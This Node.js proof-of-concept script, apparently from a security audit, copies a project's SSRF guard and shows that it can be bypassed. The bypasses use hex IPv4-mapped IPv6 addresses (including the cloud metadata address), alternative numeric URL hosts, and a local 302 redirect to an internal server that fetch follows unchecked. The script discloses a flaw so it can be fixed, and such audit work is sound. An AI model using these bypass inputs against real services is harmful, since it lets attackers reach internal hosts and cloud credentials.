// PoC-2: ssrf-guard.ts 绕过验证 + web-fetch.ts 重定向跟随实证
// 运行: node .agents/audit-poc/poc-2-ssrf.mjs

import dns from 'node:dns';
import net from 'node:net';
import http from 'node:http';

// ===== 逐字复刻 src/infra/ssrf-guard.ts =====
function ipv4ToInt(ip) {
  const parts = ip.split('.');
  if (parts.length !== 4) return null;
  let n = 0;
  for (const p of parts) {
    if (!/^\d+$/.test(p)) return null;
    const v = Number(p);
    if (v < 0 || v > 255) return null;
    n = (n << 8) | v;
  }
  return n >>> 0;
}
const BLOCKED_IPV4_CIDRS = [
  ['0.0.0.0', 8], ['10.0.0.0', 8], ['100.64.0.0', 10], ['127.0.0.0', 8],
  ['169.254.0.0', 16], ['172.16.0.0', 12], ['192.0.0.0', 24], ['192.0.2.0', 24],
  ['192.88.99.0', 24], ['192.168.0.0', 16], ['198.51.100.0', 24], ['203.0.113.0', 24],
  ['224.0.0.0', 4], ['240.0.0.0', 4],
];
function isBlockedIpv4(ip) {
  const n = ipv4ToInt(ip);
  if (n === null) return false;
  for (const [base, prefix] of BLOCKED_IPV4_CIDRS) {
    const baseInt = ipv4ToInt(base);
    const mask = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
    if ((n & mask) === (baseInt & mask)) return true;
  }
  return false;
}
function isBlockedIpv6(ip) {
  const s = ip.toLowerCase();
  const mapped = s.match(/^::ffff:(\d+\.\d+\.\d+\.\d+)$/);
  if (mapped) return isBlockedIpv4(mapped[1]);
  if (s === '::1' || s === '::') return true;
  if (/^fe[89ab]/.test(s)) return true;
  if (/^f[cd]/.test(s)) return true;
  if (/^ff/.test(s)) return true;
  if (s.startsWith('2001:db8')) return true;
  if (s.startsWith('64:ff9b::')) return true;
  return false;
}
function isBlockedIp(ip) {
  if (typeof ip !== 'string' || ip.length === 0) return false;
  const family = net.isIP(ip);
  if (family === 4) return isBlockedIpv4(ip);
  if (family === 6) return isBlockedIpv6(ip);
  return false;
}
async function assertUrlAllowed(rawUrl) {
  const u = new URL(rawUrl);
  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new Error('仅支持 http/https 协议');
  const host = (u.hostname || '').replace(/^\[|\]$/g, '');
  if (!host) throw new Error('URL 缺少主机名');
  if (net.isIP(host)) {
    if (isBlockedIp(host)) throw new Error('拒绝访问内网/保留地址: ' + host);
    return;
  }
  let addrs;
  try { addrs = await dns.promises.lookup(host, { all: true }); }
  catch (err) { throw new Error('无法解析主机名 ' + host + ': ' + (err.message || String(err))); }
  if (!addrs || addrs.length === 0) throw new Error('无法解析主机名 ' + host);
  for (const a of addrs) {
    if (isBlockedIp(a.address)) throw new Error('拒绝访问内网/保留地址: ' + host + ' -> ' + a.address);
  }
}
// ===== 复刻结束 =====

console.log('===== 第一组：IP 字面量直接判定 =====');
const ipCases = [
  ['127.0.0.1', true, '基准：回环应拦'],
  ['[::1]'.replace(/^\[|\]$/g, ''), true, '基准：IPv6 回环应拦'],
  ['169.254.169.254', true, '基准：云元数据应拦'],
  ['::ffff:127.0.0.1', true, 'IPv4-mapped 点分式（代码正则覆盖）'],
  ['::ffff:7f00:1', false, '★ IPv4-mapped 十六进制形式 = 127.0.0.1，代码未覆盖'],
  ['::ffff:a9fe:a9fe', false, '★ = 169.254.169.254（云元数据），未覆盖'],
  ['::ffff:10.0.0.1', true, 'IPv4-mapped 私网点分式'],
];
for (const [ip, expect, note] of ipCases) {
  const blocked = isBlockedIp(ip);
  const fam = net.isIP(ip);
  console.log(`  ${blocked ? '拦截' : '放行'}  ${ip.padEnd(22)} family=${fam}  ${note}${blocked === expect ? '' : '  <== 与预期偏差'}`);
}

console.log('\n===== 第二组：WHATWG URL 归一化后的 hostname（assertUrlAllowed 实际拿到的值）=====');
const urlHost = (u) => new URL(u).hostname.replace(/^\[|\]$/g, '');
const normCases = [
  'http://0x7f000001/',
  'http://2130706433/',
  'http://0177.0.0.1/',
  'http://[::ffff:7f00:1]/',
  'http://127.0.0.1.nip.io/',
];
for (const u of normCases) {
  try {
    const host = urlHost(u);
    await assertUrlAllowed(u).then(
      () => console.log(`  ${u.padEnd(32)} -> hostname=${host.padEnd(22)} 【守卫：放行】`),
      (e) => console.log(`  ${u.padEnd(32)} -> hostname=${host.padEnd(22)} 【守卫：拒绝 ${e.message}】`)
    );
  } catch (e) {
    console.log(`  ${u.padEnd(32)} -> URL 解析异常: ${e.message}`);
  }
}

console.log('\n===== 第三组：web-fetch 重定向跟随实证（守卫只校验首 URL）=====');
// 内网服务器（模拟云元数据/内网服务）
const internal = http.createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'text/plain' });
  res.end('INTERNAL-SECRET: 169.254.169.254-like metadata content');
});
// 跳板服务器：首跳 URL 是"公网地址"（守卫放行），302 到内网
const jumper = http.createServer((req, res) => {
  res.writeHead(302, { location: 'http://127.0.0.1:9902/internal' });
  res.end();
});
await new Promise((r) => internal.listen(9902, '127.0.0.1', r));
await new Promise((r) => jumper.listen(9901, '127.0.0.1', r));

// 模拟 web-fetch.ts:159 的调用（fetch 默认 redirect:'follow'，无 redirect 重校验）
// 注意：真实攻击中首跳是公网域名（守卫通过 DNS 校验）；这里用本机跳板等价演示"守卫已放行首 URL"后的行为。
const resp = await fetch('http://127.0.0.1:9901/', {});
console.log('  最终 response.url =', resp.url);
const body = await resp.text();
console.log('  最终拿到的 body   =', body);
console.log('  => fetch 默认跟随 302 到内网地址并回传内容；web-fetch.ts 仅在首 URL 调 assertUrlAllowed，未对 response.url 复检');

jumper.close(); internal.close();
console.log('\n===== 结束 =====');
